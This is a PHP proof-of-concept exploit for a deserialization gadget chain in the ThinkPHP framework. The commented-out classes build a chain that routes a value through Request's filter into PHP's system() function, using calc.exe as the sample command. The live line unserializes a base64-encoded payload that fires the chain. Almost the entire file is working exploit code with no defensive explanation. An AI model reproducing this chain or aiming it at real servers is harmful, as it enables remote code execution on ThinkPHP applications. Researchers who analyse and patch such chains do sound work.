<?php
///**
// * Created by PhpStorm.
// * User: Administrator
// * Date: 2019/9/25
// * Time: 11:13
// */
//// 找到复用conversion的类
//namespace think;
//class Request
//{
//    protected $hook = [];
//    protected $filter = "";
//    protected $config = [
//        // 表单请求类型伪装变量
//        'var_method'       => '_method',
//        // 表单ajax伪装变量
//        'var_ajax'         => '_ajax',
//        // 表单pjax伪装变量
//        'var_pjax'         => '_pjax',
//        // PATHINFO变量名 用于兼容模式
//        'var_pathinfo'     => 's',
//        // 兼容PATH_INFO获取
//        'pathinfo_fetch'   => ['ORIG_PATH_INFO', 'REDIRECT_PATH_INFO', 'REDIRECT_URL'],
//        // 默认全局过滤方法 用逗号分隔多个
//        'default_filter'   => '',
//        // 域名根，如thinkphp.cn
//        'url_domain_root'  => '',
//        // HTTPS代理标识
//        'https_agent_name' => '',
//        // IP代理获取标识
//        'http_agent_ip'    => 'HTTP_X_REAL_IP',
//        // URL伪静态后缀
//        'url_html_suffix'  => 'html',
//    ];
//    function __construct(){
//        $this->filter = "system";
//        $this->config = ["var_ajax"=>''];
//        $this->hook = ["visible"=>[$this,"isAjax"]];
//    }
//}
//
//
//
//
//abstract class Model{
//    protected $append = [];
//    private $data = [];
//    function __construct(){
//        $this->append = ["ethan"=>["calc.exe","calc"]];
//        $this->data = ["ethan"=>new Request()];
//    }
//}
//
//namespace think\model;
//use think\Model;
//
//class Pivot extends Model
//{
//}
//
//namespace think\process\pipes;
//// 可以去掉？？
////use think\model\concern\Conversion;
//use think\model\Pivot;
//
//class Windows{
//    private $files = [];
//    public function __construct(){
//        // 参数为数组
//        $this->file = [new Pivot()];
//    }
//}
//
//
//echo serialize(new Windows());

unserialize(base64_decode('TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czo1OiJldGhhbiI7YToyOntpOjA7czo4OiJjYWxjLmV4ZSI7aToxO3M6NDoiY2FsYyI7fX1zOjE3OiIAdGhpbmtcTW9kZWwAZGF0YSI7YToxOntzOjU6ImV0aGFuIjtPOjEzOiJ0aGlua1xSZXF1ZXN0IjozOntzOjc6IgAqAGhvb2siO2E6MTp7czo3OiJ2aXNpYmxlIjthOjI6e2k6MDtyOjk7aToxO3M6NjoiaXNBamF4Ijt9fXM6OToiACoAZmlsdGVyIjtzOjY6InN5c3RlbSI7czo5OiIAKgBjb25maWciO2E6MTp7czo4OiJ2YXJfYWpheCI7czowOiIiO319fX19fQ=='));


?>